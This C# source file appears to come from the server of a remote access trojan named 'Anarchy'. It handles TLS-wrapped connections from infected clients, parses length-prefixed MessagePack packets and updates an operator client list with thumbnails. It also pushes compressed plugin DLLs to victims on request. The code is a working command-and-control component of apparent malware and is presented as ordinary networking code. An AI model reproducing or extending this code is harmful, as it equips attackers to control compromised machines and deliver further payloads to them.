using System;
using System.Drawing;
using System.IO;
using System.Media;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Auth;
using Anarchy.Handlers;
using Anarchy.Helpers.Algorithm;
using Anarchy.Helpers.MessagePack;
using Anarchy.Properties;
using Settings = Anarchy.Helpers.Settings;

namespace Anarchy.Networking
{
    public class Clients
    {
        public Socket TcpClient { get; set; }

        public SslStream SslClient { get; set; }

        public ListViewItem LV { get; set; }

        public ListViewItem LV2 { get; set; }

        public string ID { get; set; }

        private byte[] ClientBuffer { get; set; }

        private long HeaderSize { get; set; }

        private long Offset { get; set; }

        private bool ClientBufferRecevied { get; set; }

        public object SendSync { get; set; }

        public long BytesRecevied { get; set; }

        public string Ip { get; set; }

        public bool Admin { get; set; }

        public DateTime LastPing { get; set; }

        public Clients(Socket socket)
        {
            SendSync = new object();
            TcpClient = socket;
            Ip = TcpClient.RemoteEndPoint.ToString().Split(':')[0];
            SslClient = new SslStream(new NetworkStream(TcpClient, true), false);
            SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, EndAuthenticate, null);
        }

        private void EndAuthenticate(IAsyncResult ar)
        {
            try
            {
                SslClient.EndAuthenticateAsServer(ar);
                Offset = 0;
                HeaderSize = 4;
                ClientBuffer = new byte[HeaderSize];
                SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
            }
            catch
            {
                SslClient?.Dispose();
                TcpClient?.Dispose();
            }
        }

        public void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!TcpClient.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int recevied = SslClient.EndRead(ar);
                    if (recevied > 0)
                    {
                        HeaderSize -= recevied;
                        Offset += recevied;
                        switch (ClientBufferRecevied)
                        {
                            case false:
                                {
                                    if (HeaderSize == 0)
                                    {
                                        HeaderSize = BitConverter.ToInt32(ClientBuffer, 0);
                                        if (HeaderSize > 0)
                                        {
                                            ClientBuffer = new byte[HeaderSize];
                                            Offset = 0;
                                            ClientBufferRecevied = true;
                                        }
                                    }
                                    else if (HeaderSize < 0)
                                    {
                                        Disconnected();
                                        return;
                                    }
                                    break;
                                }

                            case true:
                                {
                                    lock (Settings.LockReceivedSendValue)
                                        Settings.ReceivedValue += recevied;
                                    BytesRecevied += recevied;
                                    if (HeaderSize == 0)
                                    {
                                        ThreadPool.QueueUserWorkItem(new Packet
                                        {
                                            client = this,
                                            data = ClientBuffer,
                                        }.Read, null);
                                        Offset = 0;
                                        HeaderSize = 4;
                                        ClientBuffer = new byte[HeaderSize];
                                        ClientBufferRecevied = false;
                                    }
                                    else if (HeaderSize < 0)
                                    {
                                        Disconnected();
                                        return;
                                    }
                                    break;
                                }
                        }
                        SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }

        public void Disconnected()
        {
            if (this.LV != null)
            {
                Program.form1.Invoke((MethodInvoker)delegate
                {
                    try
                    {
                        lock (Settings.LockListviewClients)
                        {
                            this.LV.Remove();
                        }
                        if (this.LV2 != null)
                        {
                            lock (Settings.LockListviewThumb)
                            {
                                this.LV2.Remove();
                            }
                        }
                    }
                    catch
                    {
                    }
                    new HandleLogs().Addmsg("Client " + this.Ip + " disconnected.", Color.Red);
                    if (TimeZoneInfo.Local.Id == "China Standard Time" && Properties.Settings.Default.Notification)
                    {
                        SoundPlayer soundPlayer;
                        soundPlayer = new SoundPlayer(Resources.offline);
                        soundPlayer.Load();
                        soundPlayer.Play();
                    }
                });
            }
            try
            {
                this.SslClient?.Dispose();
                this.TcpClient?.Dispose();
            }
            catch
            {
            }
        }

        public bool GetListview(string id)
        {
            foreach (ListViewItem item in Program.form1.listView4.Items)
            {
                if (item.ToolTipText == id)
                {
                    return true;
                }
            }
            return false;
        }

        public void Send(object msg)
        {
            lock (this.SendSync)
            {
                try
                {
                    if (!this.TcpClient.Connected)
                    {
                        this.Disconnected();
                    }
                    else
                    {
                        if ((byte[])msg == null)
                        {
                            return;
                        }
                        byte[] array;
                        array = (byte[])msg;
                        byte[] bytes;
                        bytes = BitConverter.GetBytes(array.Length);
                        this.TcpClient.Poll(-1, SelectMode.SelectWrite);
                        this.SslClient.Write(bytes, 0, bytes.Length);
                        if (array.Length > 1000000)
                        {
                            using (MemoryStream memoryStream = new MemoryStream(array))
                            {
                                int num;
                                num = 0;
                                memoryStream.Position = 0L;
                                byte[] array2;
                                array2 = new byte[50000];
                                while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
                                {
                                    this.TcpClient.Poll(-1, SelectMode.SelectWrite);
                                    this.SslClient.Write(array2, 0, num);
                                    lock (Settings.LockReceivedSendValue)
                                    {
                                        Settings.SentValue += num;
                                    }
                                }
                                return;
                            }
                        }
                        this.TcpClient.Poll(-1, SelectMode.SelectWrite);
                        this.SslClient.Write(array, 0, array.Length);
                        this.SslClient.Flush();
                        lock (Settings.LockReceivedSendValue)
                        {
                            Settings.SentValue += array.Length;
                            return;
                        }
                    }
                }
                catch
                {
                    this.Disconnected();
                }
            }
        }

        public void SendPlugin(string hash)
        {
            try
            {
                string[] files;
                files = Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly);
                int num;
                num = 0;
                string text;
                while (true)
                {
                    if (num < files.Length)
                    {
                        text = files[num];
                        if (hash == GetHash.GetChecksum(text))
                        {
                            break;
                        }
                        num++;
                        continue;
                    }
                    return;
                }
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").SetAsString("save_Plugin");
                msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(text)));
                msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(text));
                ThreadPool.QueueUserWorkItem(Send, msgPack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg("Clinet " + this.Ip + " " + ex.Message, Color.Red);
            }
        }
    }
}
